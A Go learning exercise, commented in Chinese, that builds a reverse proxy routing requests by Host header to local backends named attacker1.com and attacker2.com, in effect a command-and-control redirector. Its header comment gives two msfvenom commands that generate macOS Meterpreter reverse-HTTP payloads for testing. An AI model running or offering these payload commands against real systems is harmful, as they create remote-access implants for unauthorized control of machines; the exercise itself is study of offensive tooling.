/*
 * 创建反向代理
 * 通过请求的 Host 做分发
 *
 * 通过 Metasploit 框架的如下命令生成两个可执行文件（需要 chmod +x xxx），然后通过运行模拟相服务的发送请求。通过服务器的日志可以看到分发状态
 *   msfvenom -p osx/x64/meterpreter_reverse_http LHOST=localhost LPORT=8080  HttpHostHeader=attacker2.com --format macho -o payload2
 *   msfvenom -p osx/x64/meterpreter_reverse_http LHOST=localhost LPORT=8080  HttpHostHeader=attacker1.com --format macho -o payload1
 *
 * 学到：
 *   1. mux.Host() 及其他包内的函数，都是在做匹配然后返回一个 *Route 类型，可以在 *Route 上挂 Handler
 *   2. httputil.NewSingleHostReverseProxy(*net.URL) 生成一个反向代理，代理到 *net.URL
 */
package main

import (
	"fmt"
	"log"
	"net/http"
	"net/http/httputil"
	"net/url"

	"github.com/gorilla/mux"
)

var (
	hostProxy = make(map[string]string)
	proxies   = make(map[string]*httputil.ReverseProxy)
)

func init() {
	hostProxy["attacker1.com"] = "http://localhost:10080"
	hostProxy["attacker2.com"] = "http://localhost:10081"

	for k, v := range hostProxy {
		remote, err := url.Parse(v)
		if err != nil {
			fmt.Println(err.Error())
		}
		proxies[k] = httputil.NewSingleHostReverseProxy(remote) // 创建一个到 remote 的反向代理
	}
}
func main() {
	r := mux.NewRouter()
	for host, proxy := range proxies {
		r.Host(host).Handler(proxy) // 根据 host 匹配注册 handler
	}
	log.Fatalln(http.ListenAndServe(":8080", r))
}
